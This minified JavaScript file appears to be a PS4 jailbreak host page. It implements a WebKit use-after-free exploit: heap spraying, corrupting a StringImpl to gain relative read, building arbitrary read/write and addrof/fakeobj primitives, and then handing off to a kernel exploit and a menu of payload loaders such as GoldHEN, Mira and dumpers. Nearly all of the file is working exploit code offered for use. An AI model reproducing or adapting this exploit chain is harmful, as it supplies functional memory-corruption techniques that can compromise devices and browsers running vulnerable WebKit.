const OFFSET_ELEMENT_REFCOUNT=16,OFFSET_JSAB_VIEW_VECTOR=16,OFFSET_JSAB_VIEW_LENGTH=24,OFFSET_LENGTH_STRINGIMPL=4,OFFSET_HTMLELEMENT_REFCOUNT=20,LENGTH_ARRAYBUFFER=8,LENGTH_STRINGIMPL=20,LENGTH_JSVIEW=32,LENGTH_VALIDATION_MESSAGE=48,LENGTH_TIMER=72,LENGTH_HTMLTEXTAREA=216,SPRAY_ELEM_SIZE=24576,SPRAY_STRINGIMPL=4096,NB_FRAMES=4e3,NB_REUSE=32768;var g_arr_ab_1=[],g_arr_ab_2=[],g_arr_ab_3=[],g_frames=[],g_relative_read=null,g_relative_rw=null,g_ab_slave=null,g_ab_index=null,g_timer_leak=null,g_jsview_leak=null,g_jsview_butterfly=null,g_message_heading_leak=null,g_message_body_leak=null,g_textarea_div_elem=null,g_obj_str={},g_rows1="1px,".repeat(LENGTH_VALIDATION_MESSAGE/8-2)+"1px",g_rows2="2px,".repeat(LENGTH_VALIDATION_MESSAGE/8-2)+"2px",g_round=1,g_input=null,guess_htmltextarea_addr=new Int64("0x2031b00d8");function setupRW(){for(let e=0;e<g_arr_ab_3.length;e++)if(255<g_arr_ab_3[e].length){g_relative_rw=g_arr_ab_3[e],debug_log("[+] Succesfully got a relative R/W");break}null===g_relative_rw&&die("[!] Failed to setup a relative R/W primitive"),debug_log("[+] Setting up arbitrary R/W");var e=g_jsview_leak.sub(g_timer_leak).low32()-LENGTH_STRINGIMPL+1,e=new Int64(str2array(g_relative_read,8,e+OFFSET_JSAB_VIEW_VECTOR)),e=g_jsview_leak.sub(e).low32();g_ab_index=g_relative_rw[e+LENGTH_JSVIEW+OFFSET_JSAB_VIEW_LENGTH]===LENGTH_ARRAYBUFFER?e+LENGTH_JSVIEW:e-LENGTH_JSVIEW,g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_LENGTH]=65;for(let e=0;e<g_arr_ab_3.length;e++)if(65===g_arr_ab_3[e].length){g_ab_slave=g_arr_ab_3[e],g_arr_ab_3=null;break}null===g_ab_slave&&die("[!] Didn't found the slave JSArrayBufferView"),g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_LENGTH]=255,g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_LENGTH+1]=255,g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_LENGTH+2]=255,g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_LENGTH+3]=255,debug_log("[+] Testing arbitrary R/W");e=read64(guess_htmltextarea_addr);write64(guess_htmltextarea_addr,new Int64("0x4141414141414141")),read64(guess_htmltextarea_addr).equals("0x4141414141414141")||die("[!] Failed to setup arbitrary R/W primitive"),debug_log("[+] Succesfully got arbitrary R/W!"),write64(guess_htmltextarea_addr,e),cleanup(),g_ab_slave.leakme=4919;for(var r=0,a=15;8<=a;a--)r=256*r+g_relative_rw[g_ab_index+a];read64((g_jsview_butterfly=new Int64(r)).sub(16)).equals(new Int64("0xffff000000001337"))||die("[!] Failed to setup addrof/fakeobj primitives"),debug_log("Webkit concluído. Excecutando a exploração do kernel (RISCO DE KP)..."),window.postExploit&&window.postExploit()}function toggle_payload(e){"binloader"==e?(document.getElementById("progress").innerHTML="Aguardando a CARGA ÚTIL... Envie pela porta 9020.",preloadScripts(["preloader.js","loader.js"])):"mira"==e?(document.getElementById("progress").innerHTML="Carregando MIRA.. Por favor, AGUARDE!!!",preloadScripts(["preloader.js","mira.js","loader.js"])):"mira2"==e?(document.getElementById("progress").innerHTML="Carregando MIRA + SPOOF... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","mira2.js","loader.js"])):"hen213b"==e?(document.getElementById("progress").innerHTML="Carregando Hen v2.1.3b... Por favor, AGUARDE!!!",preloadScripts(["preloaderx.js","hen213b.js","loader.js"])):"goldhen"==e?(document.getElementById("progress").innerHTML="Carregando GoldHen v1.0... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","goldhen.js","loader.js"])):"goldhen2"==e?(document.getElementById("progress").innerHTML="Carregando GoldHen v1.1... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","goldhen2.js","loader.js"])):"dumper"==e?(document.getElementById("progress").innerHTML="Carregando o dumper... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","dumper.js","loader.js"])):"FTP"==e?(document.getElementById("progress").innerHTML="Carregando o FTP... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","ftp.js","loader.js"])):"backup"==e?(document.getElementById("progress").innerHTML="Carregando Carga Útil (backup)... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","backup.js","loader.js"])):"restore"==e?(document.getElementById("progress").innerHTML="Carregando Carga Útil (restore)... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","restore.js","loader.js"])):"app2usb"==e?(document.getElementById("progress").innerHTML="Carregando o app2USB... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","app2usb.js","loader.js"])):"ps4debug"==e?(document.getElementById("progress").innerHTML="Carregando o PS4Debug... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","ps4debug.js","loader.js"])):"todex"==e?(document.getElementById("progress").innerHTML="Carregando o ToDex... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","todex.js","loader.js"])):"kerneldumper"==e?(document.getElementById("progress").innerHTML="Carregando o Kernel Dumper... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","kerneldumper.js","loader.js"])):"disableupdate"==e?(document.getElementById("progress").innerHTML="Carregando o disable update... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","disableupdate.js","loader.js"])):"enableupdate"==e?(document.getElementById("progress").innerHTML="Carregando o enableupdate... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","enableupdate.js","loader.js"])):"payload"==e?(document.getElementById("progress").innerHTML="Abrindo página de ativação(ões)... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","payload.js","loader.js","frontend.js"])):"linux1"==e?(document.getElementById("progress").innerHTML="Carregando o Linux 1g... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","linux1.js","loader.js"])):"linux3"==e?(document.getElementById("progress").innerHTML="Carregando o Linux 3g... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","linux3.js","loader.js"])):"webrte"==e?(document.getElementById("progress").innerHTML="Carregando o WebRTE... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","webrte.js","loader.js"])):"arabicGuy100"==e?(document.getElementById("progress").innerHTML="Carregando o ArabicGuy100... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","arabicGuy100.js","loader.js"])):"arabicGuy127"==e?(document.getElementById("progress").innerHTML="Carregando o ArabicGuy127... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","arabicGuy127.js","loader.js"])):"arabicGuy132"==e?(document.getElementById("progress").innerHTML="Carregando o ArabicGuy132... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","arabicGuy132.js","loader.js"])):"native100"==e?(document.getElementById("progress").innerHTML="Carregando o Native100... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","native100.js","loader.js"])):"native127"==e?(document.getElementById("progress").innerHTML="Carregando o Native127... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","native127.js","loader.js"])):"native132"==e?(document.getElementById("progress").innerHTML="Carregando o Native132... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","native132.js","loader.js"])):"lamance132"==e?(document.getElementById("progress").innerHTML="Carregando o lamance132... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","lamance132.js","loader.js"])):"toolbox"==e?(document.getElementById("progress").innerHTML="Carregando ToolBox... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","toolbox.js","loader.js"])):"rif"==e?(document.getElementById("progress").innerHTML="Carregando RIF... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","rif.js","loader.js"])):"idu"==e?(document.getElementById("progress").innerHTML="Carregando IDU... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","idu.js","loader.js"])):"aslr"==e?(document.getElementById("progress").innerHTML="Carregando ASLR... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","aslr.js","loader.js"])):"kernelclock"==e?(document.getElementById("progress").innerHTML="Carregando kernelclock... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","kernelclock.js","loader.js"])):"enablebrowser"==e?(document.getElementById("progress").innerHTML="Carregando enablebrowser... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","enablebrowser.js","loader.js"])):"historyBlocker"==e?(document.getElementById("progress").innerHTML="Carregando historyBlocker... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","historyBlocker.js","loader.js"])):"fancontrol"==e&&(document.getElementById("progress").innerHTML="Enviando temperatura alvo... Por favor, AGUARDE!!!",preloadScripts(["preloader.js","fancontrol.js","loader.js"])),window.postPayload&&window.postPayload(),payload_finished(e)}function payload_finished(e){"binloader"==e?setTimeout(function(){document.getElementById("progress").innerHTML="Aguardando a carga útil! Enviar pela porta 9021"},7e3):"exploit"!=e&&"exploit_old"!=e&&setTimeout(function(){document.getElementById("progress").innerHTML="Carga útil injetada com sucesso!"},7e3)}function read(r,a){for(let e=0;e<8;e++)g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_VECTOR+e]=r.byteAt(e);let o=[];for(let e=0;e<a;e++)o.push(g_ab_slave[e]);return o}function read64(e){return new Int64(read(e,8))}function write(r,a){for(let e=0;e<8;e++)g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_VECTOR+e]=r.byteAt(e);for(let e=0;e<a.length;e++)g_ab_slave[e]=a[e]}function write64(e,r){write(e,r.bytes())}function addrof(e){return g_ab_slave.leakme=e,read64(g_jsview_butterfly.sub(16))}function fakeobj(e){return write64(g_jsview_butterfly.sub(16),e),g_ab_slave.leakme}function cleanup(){select1.remove(),select1=null,input1.remove(),input1=null,input2.remove(),input2=null,input3.remove(),input3=null,div1.remove(),div1=null,g_frames=g_rows2=g_rows1=g_input=null}function confuseTargetObjRound2(){!1===findTargetObj()&&die("[!] Failed to reuse target obj."),g_fake_validation_message[4]=g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH+5-OFFSET_HTMLELEMENT_REFCOUNT).asDouble(),setTimeout(setupRW,6e3)}function leakJSC(){debug_log("[+] Looking for the smashed StringImpl...");var r=Object.getOwnPropertyNames(g_obj_str);for(let e=r.length-1;0<e;e--)if(255<r[e].length){debug_log("[+] StringImpl corrupted successfully"),g_relative_read=r[e],g_obj_str=null;break}null===g_relative_read&&die("[!] Failed to setup a relative read primitive"),debug_log("[+] Got a relative read");for(var e={},a=0;a<1e5;a++)e["Z".repeat(123-LENGTH_STRINGIMPL)+(""+a).padStart(5,"0")]=4919;var o=new ArrayBuffer(LENGTH_ARRAYBUFFER);let t=[];for(let e=0;e<65536;e++)(64512<=e?g_arr_ab_3:t).push(new Uint8Array(o));t=null;for(var d=[],a=0;a<1024;a++)d.push({value:1111638594}),d.push({value:g_arr_ab_3[a]});for(;null===g_jsview_leak;){Object.defineProperties({},d);for(let e=0;e<8388608;e++){var l=void 0;if(66===g_relative_read.charCodeAt(e)&&66===g_relative_read.charCodeAt(e+1)&&66===g_relative_read.charCodeAt(e+2)&&66===g_relative_read.charCodeAt(e+3)&&(0===g_relative_read.charCodeAt(e+8)&&0===g_relative_read.charCodeAt(e+15)&&0===g_relative_read.charCodeAt(e+16)&&0===g_relative_read.charCodeAt(e+23)&&14===g_relative_read.charCodeAt(e+24)&&0===g_relative_read.charCodeAt(e+31)&&0===g_relative_read.charCodeAt(e+40)&&0===g_relative_read.charCodeAt(e+47)&&0===g_relative_read.charCodeAt(e+48)&&0===g_relative_read.charCodeAt(e+55)&&14===g_relative_read.charCodeAt(e+56)&&0===g_relative_read.charCodeAt(e+63)?l=new Int64(str2array(g_relative_read,8,e+32)):66===g_relative_read.charCodeAt(e+16)&&66===g_relative_read.charCodeAt(e+17)&&66===g_relative_read.charCodeAt(e+18)&&66===g_relative_read.charCodeAt(e+19)&&(l=new Int64(str2array(g_relative_read,8,e+8)))),void 0!==l&&l.greater(g_timer_leak)&&0===l.sub(g_timer_leak).hi32()){g_jsview_leak=l,d=null;break}}}debug_log("[+] JSArrayBufferView: "+g_jsview_leak),prepareUAF()}function confuseTargetObjRound1(){sprayStringImpl(SPRAY_STRINGIMPL,2*SPRAY_STRINGIMPL),!1===findTargetObj()&&die("[!] Failed to reuse target obj."),dumpTargetObj(),g_fake_validation_message[4]=g_timer_leak.add(8*LENGTH_TIMER+OFFSET_LENGTH_STRINGIMPL+1-OFFSET_ELEMENT_REFCOUNT).asDouble(),setTimeout(leakJSC,6e3)}function handle2(){input2.focus()}function reuseTargetObj(){document.body.appendChild(g_input);for(let e=NB_FRAMES/2-16;e<NB_FRAMES/2+16;e++)g_frames[e].setAttribute("rows",",");for(let e=0;e<NB_REUSE;e++){var r=new ArrayBuffer(LENGTH_VALIDATION_MESSAGE);let e=new Float64Array(r);e[0]=guess_htmltextarea_addr.asDouble(),e[3]=guess_htmltextarea_addr.asDouble(),g_arr_ab_1.push(e)}1==g_round?(sprayStringImpl(0,SPRAY_STRINGIMPL),g_frames=[],g_round+=1,g_input=input3,setTimeout(confuseTargetObjRound1,10)):setTimeout(confuseTargetObjRound2,10)}function dumpTargetObj(){debug_log("[+] m_timer: "+g_timer_leak),debug_log("[+] m_messageHeading: "+g_message_heading_leak),debug_log("[+] m_messageBody: "+g_message_body_leak)}function findTargetObj(){for(let e=0;e<g_arr_ab_1.length;e++)if(!Int64.fromDouble(g_arr_ab_1[e][2]).equals(Int64.Zero))return debug_log("[+] Found fake ValidationMessage"),2===g_round&&(g_timer_leak=Int64.fromDouble(g_arr_ab_1[e][2]),g_message_heading_leak=Int64.fromDouble(g_arr_ab_1[e][4]),g_message_body_leak=Int64.fromDouble(g_arr_ab_1[e][5]),g_round++),g_fake_validation_message=g_arr_ab_1[e],g_arr_ab_1=[],!0;return!1}function prepareUAF(){g_input.setCustomValidity("ps4");for(let e=0;e<NB_FRAMES;e++){var r=document.createElement("frameset");g_frames.push(r)}g_input.reportValidity();var e=document.createElement("div");document.body.appendChild(e),e.appendChild(g_input);for(let e=0;e<NB_FRAMES/2;e++)g_frames[e].setAttribute("rows",g_rows1);g_input.reportValidity();for(let e=NB_FRAMES/2;e<NB_FRAMES;e++)g_frames[e].setAttribute("rows",g_rows2);g_input.setAttribute("onfocus","reuseTargetObj()"),g_input.autofocus=!0}function sprayHTMLTextArea(){debug_log("[+] Spraying HTMLTextareaElement ...");let r=g_textarea_div_elem=document.createElement("div");document.body.appendChild(r),r.id="div1";var a=document.createElement("textarea");a.style.cssText="display:block-inline;height:1px;width:1px;visibility:hidden;";for(let e=0;e<SPRAY_ELEM_SIZE;e++)r.appendChild(a.cloneNode())}function sprayStringImpl(r,a){for(let e=r;e<a;e++){var o=new String("A".repeat(LENGTH_TIMER-LENGTH_STRINGIMPL-5)+e.toString().padStart(5,"0"));g_obj_str[o]=4919}}function go(){localStorage.is755Cached&&(sprayHTMLTextArea(),window.midExploit&&window.midExploit(),g_input=input1,prepareUAF())}